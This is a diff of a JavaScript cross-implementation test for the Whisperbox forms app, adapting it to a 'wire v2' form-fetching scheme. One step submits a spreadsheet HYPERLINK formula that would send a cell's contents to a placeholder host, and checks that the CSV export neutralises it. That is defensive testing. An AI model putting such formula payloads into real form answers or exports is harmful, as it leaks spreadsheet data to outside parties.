@@ -31,7 +31,11 @@ class Bridge {
   call(m, args = [], peer = "A") { const id = this.nextId++; return new Promise((r) => { this.waiters.set(id, r); this.send({ call: m, args, peer, id }); }); }
   pump(ms) { return new Promise((r) => { this.pumpDone = r; this.send({ pump: ms }); }); }
   async client() {
-    const c = new WhisperboxClient({ store: memStore(), send: async (bytes) => this.send({ tx: Buffer.from(bytes).toString("base64"), layers: this.layers }) });
+    // the JS phones share one bus node in the bridge: hand each phone's frames to the others too
+    const c = new WhisperboxClient({ store: memStore(), msgsPerEpoch: 1e6, send: async (bytes, topic) => {
+      this.send({ tx: Buffer.from(bytes).toString("base64"), layers: this.layers, topic });
+      for (const o of this.clients) if (o !== c) o.ingest([bytes]);
+    } });
     await c.init(); this.clients.push(c); c.onConnected(); return c;
   }
   close() { this.p.stdin.end(); }
@@ -66,6 +70,7 @@ for (const layers of [1, 0]) {
       // 2. phone creates (portable signing), desktop admits + answers, phone decrypts + receipts
       const fP = phone.createForm({ title: "From phone", questions: [{ id: "q1", type: "checkbox", text: "Which", required: true, options: ["x", "y"] }] }).formId;
       // formSummary covers a form the desktop hasn't opened (its snapshot shows only opened ones, FR-7)
+      await b.call("importForm", [`whisperbox://form?id=${fP}&by=${phone.identity.address}`]);   // wire v2: the desktop opens the phone's link first
       assert.ok(await until(b, async () => !!(await b.call("formSummary", [fP])).ok), "desktop admits the phone's signed form");
       assert.strictEqual((await b.call("snapshot")).diagnostics.admDropSig, 0);
       await b.call("importForm", [`whisperbox://form?id=${fP}&by=${phone.identity.address}`]);
@@ -78,6 +83,7 @@ for (const layers of [1, 0]) {
 
       // 2b. a respondent's spreadsheet formula is neutralised in the CSV, the same in JS and C++
       const fF = phone.createForm({ title: "Formula", questions: [{ id: "q1", type: "textarea", text: "Say", required: true }, { id: "q2", type: "number", text: "N", required: false, min: -10, max: 10 }] }).formId;
+      await b.call("importForm", [`whisperbox://form?id=${fF}&by=${phone.identity.address}`]);   // wire v2: the desktop opens the phone's link first
       assert.ok(await until(b, async () => !!(await b.call("formSummary", [fF])).ok), "desktop admits the formula form");
       await b.call("importForm", [`whisperbox://form?id=${fF}&by=${phone.identity.address}`]);
       assert.ok((await b.call("submitResponse", [fF, JSON.stringify([{ questionId: "q1", value: '=HYPERLINK("https://example.invalid/?"&A1,"x")' }, { questionId: "q2", value: -5 }])])).ok);
@@ -98,12 +104,14 @@ for (const layers of [1, 0]) {
       assert.ok(phone.closeForm(fP).ok);
       assert.ok(await until(b, async () => (await b.call("snapshot")).state.forms[fP].status === "closed"), "desktop sees the phone's close");
 
-      // 5. a brand-new phone catches up from the desktop via RBSR (signed keys included)
+      // 5. wire v2 (ADR 0024): a brand-new phone opens two links; each form's creator (the desktop for
+      //    fA, the first phone for fP) answers its ASK with the form's state - nobody else serves anything
       const fresh = await b.client();
-      const want = (await b.call("snapshot")).diagnostics;
-      assert.ok(await until(b, () => fresh.log.length === phone.log.length, 10000), `fresh phone reconciles the full log (${fresh.log.length}/${phone.log.length})`);
-      assert.ok(fresh.diag.rbsrRx > 0, "via RBSR");
-      assert.strictEqual(fresh.diag.legacyReseeds + (want.legacyReseeds || 0), 0, "no whole-log reseeds");
+      fresh.minute = 600;   // ASK after 0.2 s instead of 20 s
+      fresh.importForm(`whisperbox://form?id=${fA}&by=${addrA}`);
+      fresh.importForm(`whisperbox://form?id=${fP}&by=${phone.identity.address}`);
+      assert.ok(await until(b, () => !!fresh.state().forms[fA] && !!fresh.state().forms[fP], 10000), "a fresh phone gets both forms by ASK, from their creators (C++ and JS)");
+      assert.strictEqual(fresh.diag.rbsrRx + fresh.diag.legacyReseeds, 0, "no catch-up rounds, no reseeds");
 
       // 6. 0.3.2 lifecycle across implementations: desktop closes + re-opens, phone answers
       //    a yes/no question after the re-open, desktop confirms ALL in one batch event;
@@ -124,6 +132,7 @@ for (const layers of [1, 0]) {
       assert.strictEqual((await b.call("confirmAll", [fL])).events, 1);
       assert.ok(await until(b, () => phone.snapshot().state.forms[fL].myConfirmed), "phone sees its receipt from a C++ batch event");
       const fQ = phone.createForm({ title: "Phone lifecycle", questions: [{ id: "q1", type: "boolean", text: "Ok?", required: true }] }).formId;
+      await b.call("importForm", [`whisperbox://form?id=${fQ}&by=${phone.identity.address}`]);   // wire v2: the desktop opens the phone's link first
       assert.ok(await until(b, async () => !!(await b.call("formSummary", [fQ])).ok));
       assert.ok(phone.closeForm(fQ).ok && phone.reopenForm(fQ).ok);
       assert.ok(await until(b, async () => (await b.call("formSummary", [fQ])).status === "open"), "desktop folds the phone's close + re-open");
@@ -159,6 +168,7 @@ for (const layers of [1, 0]) {
       assert.ok(await until(b, () => phone.snapshot().state.forms[dQ].myReplies?.[0]?.score === 3), "phone opens the C++-sealed score with its reply key");
       const pQ = phone.createForm({ title: "Phone quiz", questions: qq, quiz }).formId;
       assert.ok(phone.snapshot().state.forms[pQ].quiz.q2.points === 2, "phone opens its own quiz key");
+      await b.call("importForm", [`whisperbox://form?id=${pQ}&by=${phone.identity.address}`]);   // wire v2: the desktop opens the link first
       assert.ok(await until(b, async () => !!(await b.call("formSummary", [pQ])).ok));
       await b.call("importForm", [`whisperbox://form?id=${pQ}&by=${phone.identity.address}`]);
       assert.ok((await b.call("submitResponse", [pQ, JSON.stringify([{ questionId: "q1", value: false }, { questionId: "q2", value: "praha" }])])).ok);
